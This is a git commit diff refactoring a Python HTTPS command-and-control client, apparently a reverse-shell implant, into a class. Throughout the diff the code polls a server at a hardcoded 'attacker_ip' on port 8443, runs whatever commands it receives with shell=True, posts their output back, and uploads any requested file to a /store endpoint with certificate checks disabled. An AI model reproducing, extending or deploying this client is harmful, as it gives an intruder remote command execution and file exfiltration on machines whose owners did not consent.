d3f501238fac77cf8e0495c18befec9a7ac842b9
Sourabh Singh <vigrahak1828@gmail.com>
2024-12-05 17:40:46 +0530

    Update client.py

--- client.py
+++ client.py
@@ -6,117 +6,108 @@ from http.client import RemoteDisconnected
 import ssl
 import platform
 
-# Function to detect the OS and check for proxy settings
-def get_proxy_settings():
-    os_type = platform.system()
-    proxy = None
+class Client:
+    def __init__(self, attacker_ip='192.168.18.128', https_port=8443):
+        self.attacker_ip = attacker_ip
+        self.https_port = https_port
+        self.proxy = self.get_proxy_settings()
 
-    if os_type == "Windows":
-        # Check for proxy settings in the environment variables
-        proxy = os.getenv('HTTP_PROXY') or os.getenv('http_proxy')
-    elif os_type == "Linux" or os_type == "Darwin":  # Darwin is macOS
-        # Check for proxy settings in the environment variables
-        proxy = os.getenv('http_proxy') or os.getenv('https_proxy')
-    
-    return proxy
+    def get_proxy_settings(self):
+        os_type = platform.system()
+        proxy = None
 
-# Data is a dict
-def send_post(data, url, verify_ssl=False, proxy=None):   # True
-    data = {"rfile": data}
-    data = parse.urlencode(data).encode()
-    req = request.Request(url, data=data)
-    
-    # Create an SSL context
-    context = ssl.create_default_context()
-    
-    # If verify_ssl is False, disable certificate verification
-    if not verify_ssl:
-        context.check_hostname = False
-        context.verify_mode = ssl.CERT_NONE
+        if os_type == "Windows":
+            proxy = os.getenv('HTTP_PROXY') or os.getenv('http_proxy')
+        elif os_type in ["Linux", "Darwin"]:  # Darwin is macOS
+            proxy = os.getenv('http_proxy') or os.getenv('https_proxy')
+        
+        return proxy
 
-    # Set proxy if available
-    if proxy:
-        proxy_handler = request.ProxyHandler({'http': proxy, 'https': proxy})
-        opener = request.build_opener(proxy_handler)
-        request.install_opener(opener)
+    def send_post(self, data, url, verify_ssl=False):   
+        data = {"rfile": data}
+        data = parse.urlencode(data).encode()
+        req = request.Request(url, data=data)
+        
+        context = ssl.create_default_context()
+        
+        if not verify_ssl:
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
 
-    try:
-        request.urlopen(req, context=context)  # Send request
-    except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
-        print(f"Error sending data: {e}")
-        print("Connection closed, exiting...")
-        exit(1)
+        if self.proxy:
+            proxy_handler = request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
+            opener = request.build_opener(proxy_handler)
+            request.install_opener(opener)
 
-def send_file(command, proxy=None):
-    try:
-        grab, path = command.strip().split(' ')
-    except ValueError:
-        send_post("[-] Invalid grab command (maybe multiple spaces)", url=f'https://10.118.24.13:8443/store', verify_ssl=True, proxy=proxy)
-        return
-
-    if not os.path.exists(path):
-        send_post("[-] Not able to find the file", url=f'https://10.118.24.13:8443/store', verify_ssl=True, proxy=proxy)
-        return
-
-    store_url = f'https://10.118.24.13:8443/store'  # Posts to /store
-    with open(path, 'rb') as fp:
         try:
-            send_post(fp.read(), url=store_url, verify_ssl=False, proxy=proxy)  # True
+            request.urlopen(req, context=context)
         except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
-            print(f"Error sending file: {e}")
+            print(f"Error sending data: {e}")
             print("Connection closed, exiting...")
             exit(1)
 
-def run_command(command, proxy=None):
-    CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    send_post(CMD.stdout.read(), url=f'https://10.118.24.13:8443', verify_ssl=False, proxy=proxy)  # True
-    send_post(CMD.stderr.read(), url=f'https://10.118.24.13:8443', verify_ssl=False, proxy=proxy)  # True
+    def send_file(self, command):
+        try:
+            grab, path = command.strip().split(' ')
+        except ValueError:
+            self.send_post("[-] Invalid grab command (maybe multiple spaces)", url=f'https://{self.attacker_ip}:{self.https_port}/store', verify_ssl=True)
+            return
 
-def connect_to_https_server(verify_ssl=False, proxy=None):  # True
-    # Create an SSL context
-    context = ssl.create_default_context()
-    
-    # If verify_ssl is False, disable certificate verification
-    if not verify_ssl:
-        context.check_hostname = False
-        context.verify_mode = ssl.CERT_NONE
+        if not os.path.exists(path):
+            self.send_post("[-] Not able to find the file", url=f'https://{self.attacker_ip}:{self.https_port}/store', verify_ssl=True)
+            return
 
-    # Set proxy if available
-    if proxy:
-        proxy_handler = request.ProxyHandler({'http': proxy, 'https': proxy})
-        opener = request.build_opener(proxy_handler)
-        request.install_opener(opener)
+        store_url = f'https://{self.attacker_ip}:{self.https_port}/store'
+        with open(path, 'rb') as fp:
+            try:
+                self.send_post(fp.read(), url=store_url, verify_ssl=False)
+            except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
+                print(f"Error sending file: {e}")
+                print("Connection closed, exiting...")
+                exit(1)
 
-    # Try connecting to the HTTPS server
-    try:
-        command = request.urlopen(f"https://10.118.24.13:8443", context=context).read().decode()
-        return command
-    except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
-        print(f"Error connecting to HTTPS server: {e}")
-        return None
+    def run_command(self, command):
+        CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        self.send_post(CMD.stdout.read(), url=f'https://{self.attacker_ip}:{self.https_port}', verify_ssl=False)
+        self.send_post(CMD.stderr.read(), url=f'https://{self.attacker_ip}:{self.https_port}', verify_ssl=False)
 
-# Get proxy settings
-proxy = get_proxy_settings()
+    def connect_to_https_server(self, verify_ssl=False):
+        context = ssl.create_default_context()
+        
+        if not verify_ssl:
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
 
-# Example of how to use the modified function
-while True:
-    command = connect_to_https_server(verify_ssl=False, proxy=proxy)  # True
-    
-    # If connection fails
-    if command is None:
-        print("HTTPS server is down, exiting...")
-        exit(1)
+        if self.proxy:
+            proxy_handler = request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
+            opener = request.build_opener(proxy_handler)
+            request.install_opener(opener)
 
-    if 'terminate' in command:
-        break
+        try:
+            command = request.urlopen(f"https://{self.attacker_ip}:{self.https_port}", context=context).read().decode()
+            return command
+        except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
+            print(f"Error connecting to HTTPS server: {e}")
+            return None
 
-    # Send file
-    if 'grab' in command:
-        send_file(command, proxy=proxy)
-        continue
+    def start(self):
+        while True:
+            command = self.connect_to_https_server(verify_ssl=False)
+            
+            if command is None:
+                print("HTTPS server is down, exiting...")
+                exit(1)
 
-    run_command(command, proxy=proxy)
-    time.sleep(1)
+            if 'terminate' in command:
+                break
+
+            if 'grab' in command:
+                self.send_file(command)
+                continue
+
+            self.run_command(command)
+            time.sleep(1)
 
 if __name__ == "__main__":
-    main()
+    client = Client()
+    client.start()
